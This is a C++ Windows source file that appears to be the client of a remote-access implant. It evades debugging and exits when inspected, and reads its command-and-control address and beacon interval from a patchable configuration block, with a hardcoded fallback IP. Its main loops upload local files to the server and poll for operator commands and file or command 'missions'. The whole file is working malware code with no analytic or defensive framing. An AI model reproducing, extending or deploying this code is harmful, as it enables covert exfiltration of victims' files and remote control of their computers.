

#include <windows.h>

#include <vector>

#include "public.h"

#include "http.h"

#include "https.h"

#include "uuid.h"
#include "packet.h"

#include "mission.h"

#include "resource.h"

#include "command.h"
#include <windows.h>
#include <Shlwapi.h>
#include "utils.h"
#include "main.h"
#include "dialog.h"

#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib,"ws2_32.lib")


using namespace std;

#pragma pack(1)

typedef struct {
	WORD      dlgVer;
	WORD      signature;
	DWORD     helpID;
	DWORD     exStyle;
	DWORD     style;
	WORD      cDlgItems;
	short     x;
	short     y;
	short     cx;
	short     cy;
	short menu;
	short windowClass;
	WCHAR     title[4];
	WORD      pointsize;
	WORD      weight;
	BYTE      italic;
	BYTE      charset;
	WCHAR     typeface[4];
} DLGTEMPLATEEX;
#pragma pack()


CONST static char g_program_params[MAX_PATH] = "0123456789abcdef";

int init() {
	int ret = 0;

	g_mutex_handle = bRunning(&ret);
	if (ret)
	{
		ExitProcess(0);
	}

	ret = isDebugged();
	if (ret)
	{
		ExitProcess(0);
	}

	WSAData wsa;
	ret = WSAStartup(0x0202, &wsa);

	PROGRAM_PARAMS* params = (PROGRAM_PARAMS*)(g_program_params + 16);
	if (params->ip)
	{
		g_httpsToggle = params->bHttps;
		g_ip = params->ip;
		g_interval = params->hbi * 1000;
		g_fsize_limit = params->fzLimit*1024*1024;

		runLog("ip:%x,https:%u,interval:%u,filesize:%u,path:%s\r\n", g_ip, g_httpsToggle, g_interval, g_fsize_limit, params->path);
	}
	else {
		g_ip = inet_addr("192.168.231.1");
		g_httpsToggle = TRUE;
	}

	ret = getUUID();

	return ret;
}



int clear() {
	int ret = 0;
	ret = WSACleanup();

	return ret;
}




int getProc() {
	int ret = 0;

// 	WCHAR url[1024];
// 	WCHAR wstruuid[256];
// 	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid));
// 	WCHAR wstrcmd[256];
// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);

	PacketParcel packet(FALSE);

	HttpsProto * http = (HttpsProto*) packet.getProtocol();

	ret = http->getSubCmd(CMD_GETHOST,GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();

		vector<CLIENT_INFO>hosts = parseHosts(data, datasize);

		int num = 0;

		string host = hosts[0].host;

		lstrcpyA(g_uuid, host.c_str());

		//ret = http.getCmd(CMD_QUERY_OPERATOR, backdata, &backsize);

		ret = http->getCmdStr(CMD_SEND_DD_DATA,"c:\\1.txt");
	
	}

	return ret;
}






int postProc() {
	int ret = 0;

	// 	WCHAR url[1024];
	// 	WCHAR wstruuid[256];
	// 	mbstowcs(wstruuid, g_uuid, sizeof(wstruuid));
	// 	WCHAR wstrcmd[256];
	// 	mbstowcs(wstrcmd, CMD_ONLINE, sizeof(wstrcmd));
	// 	wsprintfW(url, L"/%ws?Data%ws%c%wsData", MY_PHP_SERVER, wstrcmd, (unsigned char)g_uuid_len, wstruuid);

	//ret = uploadHttpsFile("test.txt");
	//ret = uploadFileTest("test.txt");
	//ret = https.postFileTest("test.txt", backdata, &backsize);

	PacketParcel packet(TRUE);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();
		vector<CLIENT_INFO>hosts = parseHosts(data, datasize);

		int num = 0;

		string host = hosts[0].host;

		lstrcpyA(g_uuid, host.c_str());

		//const char* mydata = "hello,how are you?\r\n fine,thank you,and you?\r\ni am fine too\r\n";

		const char* myfn = "C:\\Users\\ljg\\test.txt";

		ret = packet.postCmdFile(CMD_SEND_DD_DATA, myfn,16);

		Sleep(5000);

		ret = packet.postCmd(CMD_QUERY_OPERATOR,0,0);
	}

	return ret;
}



int mainProc() {
	int ret = 0;
	PacketParcel packet(TRUE);

	ret = packet.postAllCmd(CMD_GETHOST, GETHOST_ALLH);

	while (TRUE)
	{
		char* data = packet.getbuf();
		int datasize = packet.getbufsize();
		vector<CLIENT_INFO>hosts = parseHosts(data, datasize);

		int num = 0;

		string host = hosts[0].host;

		lstrcpyA(g_uuid, host.c_str());

		//const char* mydata = "hello,how are you?\r\n fine,thank you,and you?\r\ni am fine too\r\n";

		const char* myfn = "C:\\Users\\ljg\\test.txt";

		int backsize = MAX_SIZE;
		ret = packet.postCmdFile(CMD_SEND_DD_DATA, myfn,16);

		Sleep(5000);

		ret = packet.postCmd(CMD_QUERY_OPERATOR, 0, 0);

		break;
	}

	return ret;
}


int __stdcall fileMission() {
	int ret = 0;
	DataMission mission;

	mission.getFileMission();

	return ret;
}


int __stdcall cmdMission() {
	int ret = 0;
	DataMission mission;

	mission.getCmdMission();
	return ret;
}



INT_PTR dlgProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
{
	if (msg == WM_INITDIALOG)
	{

	}

	return TRUE;
	//return DefWindowProc(hwnd, msg, wparam, lparam);
}


void testmfc() {
	HMODULE h = GetModuleHandleA(0);
	int ret = 0;

	DLGTEMPLATEEX dlgex;
	//HWND m_hwnd = CreateDialogParamA(h, (LPCSTR)IDD_DIALOG7, 0, (DLGPROC)dlgProc, 0);
	INT_PTR m_hwnd = DialogBoxParamW(h, (LPCWSTR)IDD_DIALOG7,(HWND) 0, (DLGPROC)dlgProc,0);
	if (m_hwnd == 0)
	{
		ret = GetLastError();
	}

	//ret = ShowWindow(m_hwnd, SW_SHOW);

// 	MSG msg;
// 	while ((ret = GetMessage(&msg, 0, 0, 0)) != 0) {
// 
// 		if (ret == -1) {
// 			return;
// 		}
// 
// 		if (!IsDialogMessage(m_hwnd, &msg))
// 		{
// 			TranslateMessage(&msg);
// 			DispatchMessage(&msg);
// 		}
// 	}
}


int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {

	int ret = 0;

	ret = init();

	//testmfc();

	ret = createDialog(hInstance);

	//ret = fileMission();
	//ret = mainProc();

	ret = clear();

	return 0;
}